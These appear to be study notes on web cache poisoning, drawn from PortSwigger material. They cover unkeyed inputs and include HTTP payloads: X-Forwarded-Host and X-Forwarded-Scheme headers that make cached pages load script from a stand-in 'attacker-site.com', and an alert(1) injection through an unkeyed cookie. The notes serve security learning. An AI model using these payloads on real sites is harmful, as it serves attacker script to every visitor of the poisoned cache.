# Web cache poisoning

* [PortSwigger - Web Security Academy - Web cache poisoning](https://portswigger.net/web-security/web-cache-poisoning)  

## Constructing an attack

1. Identify unkeyed inputs (e.g. `X-Forwarded-Host` header)  
2. Trigger a harmful response from the server  
3. Get the response cached  

*Hint: You can you "Param Miner" Burp Suite extension for automating the process of finding such inputs.*  

## Exploitation

Websites are vulnerable when they:  

* Handle unkeyed input in an unsafe way  
* Allow the subsequent HTTP response to be cached  

### Unsafe handling of resource imports

If the `X-Forwarded-Host` header is reflected for resource imports, you can point it to a domain you control and host a malicious file there, using the same path/name as the original one.  

```http
X-Forwarded-Host: attacker-site.com
```

Result
```html
<script type="text/javascript" src="https://attacker-site.com/path/to/script.js"></script>
```

### Cookie-handling vulnerabilities

If the `Cookie` header is unkeyed and uses a parameter that is reflected on the site, this can be used to inject malicous code.  

```http
Cookie: param=value"-alert(1)-"
```

```html
<script>
    data = {
		"param":"value"-alert(1)-""
    }
</script>
```

### Multiple headers required

Sometimes it is necessary to tamper with more than just one input.  
E.g. setting `X-Forwarded-Scheme` header to something different than the default scheme (https) may trigger the usage of `X-Forwarded-Host` header. Therefore you can just inject a domain that is under your control, to serve a malicious file.  

```http
X-Forwarded-Host: attacker-site.com
X-Forwarded-Scheme: 1337
```

### Exploiting responses that expose too much information

Response headers, like follows, may reveal a lot of information, how the cache behaves and therefore can save a lot of manual testing.  

```http
Cache-Control: max-age=30
Age: 13
X-Cache: hit
```

The `Vary` response header may also tell about additional headers used in the caching key.  

```http
Vary: User-Agent
```
